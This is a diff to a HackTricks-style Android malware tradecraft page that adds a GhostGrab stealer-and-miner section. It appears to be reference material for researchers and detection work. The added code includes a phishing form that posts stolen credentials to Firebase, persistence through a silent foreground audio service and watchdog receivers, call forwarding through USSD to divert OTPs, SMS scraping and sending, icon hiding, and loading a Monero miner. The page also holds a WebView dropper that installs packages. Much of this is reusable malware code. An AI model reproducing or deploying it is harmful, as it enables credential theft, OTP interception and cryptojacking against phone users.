@@ -63,6 +63,9 @@
 
 ## Useful Frida Snippet: Auto-Bypass Invitation Code
 
+<details>
+<summary>Frida hook to bypass invite-code HTTP check</summary>
+
 ```python
 # frida -U -f com.badapp.android -l bypass.js --no-pause
 # Hook HttpURLConnection write to always return success
@@ -82,9 +85,11 @@ Java.perform(function() {
 });
 ```
 
+</details>
+
 ## Indicators (Generic)
 
-```
+```text
 /req/checkCode.php        # invite code validation
 /upload.php               # batched ZIP exfiltration
 LubanCompress 1.1.8       # "Luban" string inside classes.dex
@@ -119,7 +124,7 @@ zipgrep -i "classes|.apk" sample.apk | head
 
 Example (sanitised):
 
-```
+```text
 GET https://rebrand.ly/dclinkto2
 Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
 Transform: "gate.html" → "gate.htm" (loaded in WebView)
@@ -222,6 +227,161 @@ public void onMessageReceived(RemoteMessage msg){
 
 ---
 
+## GhostGrab-style Android Stealer + Miner tradecraft (WebView phishing, Firebase C2, foreground audio persistence)
+
+The GhostGrab campaign blends a WebView-based credential stealer with a covert native Monero miner and hard persistence using foreground audio plus watchdog receivers. The following abstractions are reusable patterns to test/detect.
+
+### Sideload + assets/WebView phishing ➜ Firebase Realtime DB exfil
+- Request `REQUEST_INSTALL_PACKAGES` to enable in-app sideloading; optionally `QUERY_ALL_PACKAGES` for discovery.
+- Sequence localised phishing pages under `assets/` in a JS-enabled WebView (e.g., `kyc.html → debit.html → net.html → pass.html → pin.html`).
+- Each page validates input client-side and exfiltrates to Firebase Realtime DB keyed by a device identifier.
+
+Minimal JS exfil to Firebase Realtime DB:
+```html
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  const form = document.querySelector('form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const payload = Object.fromEntries(new FormData(form));
+    payload.DeviceID = localStorage.getItem('dev') || (crypto.randomUUID());
+    localStorage.setItem('dev', payload.DeviceID);
+    await fetch('https://<project>.firebaseio.com/formInfo.json', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    });
+  });
+});
+</script>
+```
+
+### Foreground audio persistence to defeat Doze/background kills
+- Create a `NotificationChannel` and call `startForeground()` with an innocuous “Audio Playing” notification.
+- Loop a silent `MediaPlayer` to maintain foreground priority and keep the process alive.
+
+<details>
+<summary>Minimal foreground audio Service</summary>
+
+```java
+public class KeepAliveService extends Service {
+  private MediaPlayer mp;
+  @Override public int onStartCommand(Intent i, int f, int id){
+    String chId = "audio"; NotificationManager nm = getSystemService(NotificationManager.class);
+    if (Build.VERSION.SDK_INT >= 26) {
+      NotificationChannel ch = new NotificationChannel(chId, "Audio", NotificationManager.IMPORTANCE_LOW);
+      nm.createNotificationChannel(ch);
+    }
+    Notification n = new NotificationCompat.Builder(this, chId)
+      .setContentTitle("Audio Playing").setSmallIcon(android.R.drawable.ic_media_play).build();
+    startForeground(1, n);
+    mp = MediaPlayer.create(this, R.raw.silence); mp.setLooping(true); mp.setVolume(0f,0f); mp.start();
+    return START_STICKY;
+  }
+  @Override public void onDestroy(){ try{ if (mp!=null){ mp.stop(); mp.release(); } }catch(Exception ignored){}
+    super.onDestroy(); }
+  @Override public IBinder onBind(Intent i){ return null; }
+}
+```
+</details>
+
+Watchdog and auto-revival:
+- Exported broadcast receivers listen for boot, screen on/off, power/connectivity, package changes, and SMS; on any event they re-launch the core service with `startForegroundService()` and re-arm an `AlarmManager` to check/restart periodically.
+- Request battery-optimization exemption via `ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` to reduce throttling.
+
+<details>
+<summary>Manifest and watchdog sketch</summary>
+
+```xml
+<service android:name=".KeepAliveService" android:foregroundServiceType="dataSync|mediaPlayback" />
+
+<receiver android:name=".MultiEventReceiver" android:exported="true">
+  <intent-filter>
+    <action android:name="android.intent.action.BOOT_COMPLETED"/>
+    <action android:name="android.intent.action.SCREEN_ON"/>
+    <action android:name="android.intent.action.SCREEN_OFF"/>
+    <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+    <action android:name="android.intent.action.PACKAGE_ADDED"/>
+    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+  </intent-filter>
+</receiver>
+```
+
+```java
+public class MultiEventReceiver extends BroadcastReceiver {
+  @Override public void onReceive(Context c, Intent i){
+    c.startForegroundService(new Intent(c, KeepAliveService.class));
+    AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
+    PendingIntent p = PendingIntent.getService(c,0,new Intent(c,KeepAliveService.class),PendingIntent.FLAG_IMMUTABLE);
+    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime()+60_000, p);
+  }
+}
+```
+</details>
+
+### Firebase as covert C2 with push and DB-backed tasks
+- Register to FCM to obtain a device token. Use Realtime DB collections like `clients/<DeviceID>` and `repository` to store telemetry and captured SMS.
+- Implement simple C2 commands by writing control objects; client polls/listens and executes.
+
+Example telephony/SMS commands:
+- `callForward` — enable `**21*<NUMBER>#` and disable `##21#` via USSD to divert calls/voice OTPs.
+- `sendSms` — send arbitrary SMS from a selected SIM slot.
+- `forwardSms` — forward all incoming SMS to an operator number, with deduplication state.
+
+Code sketches:
+```java
+// Call forwarding via USSD (requires CALL_PHONE)
+String code = "**21*"+number+"#";
+Intent ussd = new Intent(Intent.ACTION_CALL, Uri.parse("tel:"+Uri.encode(code)));
+// Optional: pick SIM by PhoneAccountHandle for slot index
+startActivity(ussd);
+
+// Send SMS from a specific SIM
+SmsManager mgr = SmsManager.getSmsManagerForSubscriptionId(subId);
+mgr.sendTextMessage(to, null, message, null, null);
+```
+
+### SMS scraping and SIM profiling
+- Keyword-based harvesting from `content://sms/` and bulk upload of the last N messages with metadata.
+- Combine `SubscriptionManager` and `TelephonyManager` to fingerprint SIMs and carriers.
+
+```java
+Cursor c = getContentResolver().query(Uri.parse("content://sms/"),
+  new String[]{"_id","address","body","date","type"}, null, null, "date DESC");
+int n=0; while(c!=null && c.moveToNext() && n++<50){ /* collect rows */ }
+
+List<SubscriptionInfo> subs = SubscriptionManager.from(ctx).getActiveSubscriptionInfoList();
+for (SubscriptionInfo si: subs){ int slot = si.getSimSlotIndex(); String num = si.getNumber(); String carrier = String.valueOf(si.getCarrierName()); }
+```
+
+### Launcher/icon hiding
+- Conceal launcher presence by omitting `CATEGORY.LAUNCHER`; use a benign category instead. Services run from receivers and foreground service.
+
+```xml
+<intent-filter>
+  <action android:name="android.intent.action.MAIN"/>
+  <category android:name="android.intent.category.INFO"/>
+</intent-filter>
+```
+
+### Covert mobile crypto-mining
+- On device-lock or specific triggers, fetch an encrypted native miner (e.g., `libmine-arm64.so`) into a private dir (e.g., `d-miner/`).
+- Decrypt and load the library; start a native mining thread with TLS and Monero flags against attacker pools. Use a worker-id derived at runtime.
+
+```java
+System.load(new File(getFilesDir(), "d-miner/libmine-arm64.so").getAbsolutePath());
+startMiner(new String[]{"--tls","--coin","monero","--no-color","--nicehash",
+  "-o","pool.example.org:9000","-u","<XMR_wallet>","-k","-p","x"});
+```
+
+Hunting pointers:
+- Foreground notification titled "Audio Playing" with a looping, muted `MediaPlayer` in an unknown app.
+- Exported receivers that relaunch a foreground service on many system broadcasts; recurring `AlarmManager` wakeups.
+- FCM + Firebase DB used together by an untrusted app; keys like `clients/<DeviceID>`, `repository`, and commands `callForward|sendSms|forwardSms`.
+- USSD dial attempts containing `**21*` or `##21#` shortly after install.
+- Monero pools and hardcoded wallet in code/strings; native `.so` miner dropped under app-private paths.
+
+---
+
 ## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
 
 Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.
@@ -274,6 +434,9 @@ Attackers present a WebView pointing to an attacker page and inject a JavaScript
 
 Minimal pattern:
 
+<details>
+<summary>DropperActivity: WebView to PackageInstaller bridge</summary>
+
 ```java
 public class DropperActivity extends Activity {
   @Override protected void onCreate(Bundle b){
@@ -302,6 +465,8 @@ public class DropperActivity extends Activity {
   }
 }
 ```
+
+</details>
 
 HTML on the page:
 
@@ -440,5 +605,6 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [GhostGrab Android Malware: Hybrid Banking Stealer and Monero Miner (CYFIRMA)](https://www.cyfirma.com/research/ghostgrab-android-malware/)
 
 {{#include ../../banners/hacktricks-training.md}}
